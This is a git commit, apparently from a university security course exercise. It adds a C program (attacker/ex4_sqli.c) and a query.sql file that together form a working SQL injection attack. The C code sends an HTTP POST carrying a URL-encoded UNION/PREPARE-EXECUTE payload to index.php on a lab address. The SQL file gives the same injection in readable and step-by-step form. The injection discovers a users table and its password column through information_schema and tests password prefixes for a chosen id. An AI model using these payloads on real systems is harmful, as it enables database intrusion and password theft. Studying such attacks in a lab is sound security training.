d2030dea8d96ed45d495b698ceb81381b75d9fd8
Michael Terkeltoub <michael.terkeltoub@mail.huji.ac.il>
2026-01-14 12:41:57 +0200

    1

---
+++ attacker/ex4_sqli.c
@@ -0,0 +1,200 @@
+
+#define __MY_DEBUG__
+#define PAYLOAD"order_id=0%20UNION%20SELECT%20CONCAT%28%27SELECT%20%27%2c%20%40p%3a%3d%28SELECT%20COLUMN_NAME%20FROM%20information_schema.COLUMNS%20WHERE%20TABLE_NAME%20%3d%20t.TABLE_NAME%20AND%20COLUMN_NAME%20LIKE%20%27%25pwd%25%27%20LIMIT%201%29%2c%20%27%20FROM%20%27%2c%20TABLE_NAME%2c%20%27%20WHERE%20%27%2c%20%28SELECT%20COLUMN_NAME%20FROM%20information_schema.COLUMNS%20WHERE%20TABLE_NAME%20%3d%20t.TABLE_NAME%20AND%20COLUMN_NAME%20LIKE%20%27%25id%25%27%20LIMIT%201%29%2c%20%27%20%3d%20322695107%20AND%20%27%2c%20%40p%2c%20%27%20LIKE%20%22abc%25%22%27%29%20INTO%20%40sql%20FROM%20information_schema.TABLES%20t%20WHERE%20TABLE_NAME%20LIKE%20%27%25usr%25%27%20LIMIT%201%3b%20PREPARE%20stmt%20FROM%20%40sql%3b%20EXECUTE%20stmt%3b%20DEALLOCATE%20PREPARE%20stmt%3b"
+
+#include <limits.h>
+#include <string.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <netinet/ip.h>
+
+#define WEB_ADDR 192, 168, 1, 202
+
+union address {
+    uint8_t fields[4];
+    uint32_t l;
+};
+
+int32_t create_socket() {
+    int32_t sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd <= 0) {
+        #ifdef __MY_DEBUG__
+                printf("create socket failed...\n");
+        #endif
+                close(sockfd);
+                exit(0);
+    }
+
+    return sockfd;
+}
+
+void _listen(const int32_t sockfd) {
+    if (listen(sockfd, 5) < 0) {
+#ifdef __MY_DEBUG__
+        printf("listen failed...\n");
+#endif
+        close(sockfd);
+        exit(0);
+    }
+}
+
+void _bind(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
+           const uint8_t field2, const uint8_t field3, const uint16_t port) {
+    struct sockaddr_in addr_in = {0};
+
+    addr_in.sin_family = AF_INET;
+    const union address address = {{field0, field1, field2, field3}};
+    addr_in.sin_addr.s_addr = address.l;
+
+    addr_in.sin_port = htons(port);
+
+    if (bind(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
+#ifdef __MY_DEBUG__
+        printf("bind failed...\n");
+#endif
+        close(sockfd);
+        exit(0);
+    }
+}
+
+int32_t _accept(const int32_t sockfd) {
+    struct sockaddr addr = {0};
+    socklen_t addrlen = sizeof(addr);
+    int32_t clientfd = accept(sockfd, &addr, &addrlen);
+    if (clientfd < 0) {
+#ifdef __MY_DEBUG__
+        printf("accept failed...\n");
+#endif
+        close(sockfd);
+        exit(0);
+    }
+    return clientfd;
+}
+
+size_t _recv(const int32_t sockfd, void *  buf, size_t size) {
+    ssize_t sz = recv(sockfd, buf, size, 0);
+    if (sz < 0) {
+#ifdef __MY_DEBUG__
+        printf("recv failed...\n");
+#endif
+        close(sockfd);
+        exit(0);
+    }
+    return (size_t)sz;
+}
+
+FILE *_fopen(const char *restrict path) {
+    FILE * file = fopen(path, "w");
+    if (file == 0) {
+        #ifdef __MY_DEBUG__
+                printf("fopen failed...\n");
+        #endif
+                exit(0);
+    }
+    return file;
+}
+
+size_t _fwrite(const void *restrict ptr, size_t size, size_t nitems, FILE *restrict stream) {
+    size_t written = fwrite(ptr, size, nitems, stream);
+
+    if (written < nitems) {
+        #ifdef __MY_DEBUG__
+            printf("fwrite failed...\n");
+        #endif
+        exit(0);
+    }
+
+    return written;
+}
+
+void _sendto(const int32_t sockfd, const void *const buff, size_t buff_size,
+             const uint8_t field0, const uint8_t field1,
+             const uint8_t field2, const uint8_t field3, const uint16_t port) {
+    struct sockaddr_in addr_in = {0};
+
+    addr_in.sin_family = AF_INET;
+    const union address address = {{field0, field1, field2, field3}};
+    addr_in.sin_addr.s_addr = address.l;
+
+    addr_in.sin_port = htons(port);
+
+    if (sendto(sockfd, buff, buff_size, 0, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
+#ifdef __MY_DEBUG__
+        printf("sendto failed...\n");
+#endif
+        close(sockfd);
+        exit(0);
+    }
+}
+
+void _connect(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
+           const uint8_t field2, const uint8_t field3, const uint16_t port) {
+    struct sockaddr_in addr_in = {0};
+
+    addr_in.sin_family = AF_INET;
+    const union address address = {{field0, field1, field2, field3}};
+    addr_in.sin_addr.s_addr = address.l;
+
+    addr_in.sin_port = htons(port);
+
+    if (connect(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
+#ifdef __MY_DEBUG__
+        printf("connect failed...\n");
+#endif
+        close(sockfd);
+        exit(0);
+    }
+}
+
+void _send(const int32_t client, const void * const data, size_t size) {
+    if (0 > send(client, data, size, 0)) {
+#ifdef __MY_DEBUG__
+        perror("Sending failed...\n");
+#endif
+        close(client);
+        exit(0);
+    }
+}
+
+
+void empty_recv(const int sockfd) {
+    char buf[1024];
+    memset(buf, 0, sizeof(buf));
+
+    _recv(sockfd, buf, sizeof(buf));
+#ifdef __MY_DEBUG__
+    puts(buf);
+#endif
+}
+
+int32_t main() {
+    int32_t sockfd = create_socket();
+
+    _connect(sockfd, WEB_ADDR, 8080);
+
+    const char payload[] = PAYLOAD;
+    int payload_len = strlen(payload);
+
+    char mal_req[1024];
+
+    sprintf(mal_req, "POST /index.php? HTTP/1.1\r\n"
+        "Host: 192.168.1.202\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: %d\r\n"
+        "Connection: Keep-Alive\r\n"
+        "\r\n"
+        "%s",
+        payload_len, payload);
+
+    _send(sockfd, mal_req, strlen(mal_req));
+
+    empty_recv(sockfd);
+
+    close(sockfd);
+}
---
+++ query.sql
@@ -0,0 +1,42 @@
+0 UNION (
+SELECT CONCAT(
+    'SELECT ',
+    (SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME = t.TABLE_NAME AND COLUMN_NAME LIKE '%pwd%' LIMIT 1),
+    ' FROM ', TABLE_NAME,
+    ' WHERE ',
+    (SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME = t.TABLE_NAME AND COLUMN_NAME LIKE '%id%' LIMIT 1),
+    ' = 322695107'
+)
+INTO @sql
+FROM information_schema.TABLES t
+WHERE TABLE_NAME LIKE '%usr%' LIMIT 1;
+
+PREPARE stmt FROM @sql;
+EXECUTE stmt;
+DEALLOCATE PREPARE stmt;
+)
+
+-- 1. Get the Table and Column names into variables first
+SELECT
+    t.TABLE_NAME,
+    (SELECT COLUMN_NAME FROM information_schema.COLUMNS
+     WHERE TABLE_NAME = t.TABLE_NAME AND COLUMN_NAME LIKE '%id%' LIMIT 1),
+    (SELECT COLUMN_NAME FROM information_schema.COLUMNS
+     WHERE TABLE_NAME = t.TABLE_NAME AND COLUMN_NAME LIKE '%pwd%' LIMIT 1)
+INTO @target_table, @id_col, @pwd_col
+FROM information_schema.TABLES t
+WHERE TABLE_NAME LIKE '%usr%' LIMIT 1;
+
+-- 2. Construct the SQL string using those variables
+-- We use @pwd_col twice: once for the SELECT and once for the LIKE filter
+SET @sql = CONCAT(
+    'SELECT ', @pwd_col,
+    ' FROM ', @target_table,
+    ' WHERE ', @id_col, ' = 322695107',
+    ' AND ', @pwd_col, ' LIKE "abc%"'
+);
+
+-- 3. Execute the statement
+PREPARE stmt FROM @sql;
+EXECUTE stmt;
+DEALLOCATE PREPARE stmt;
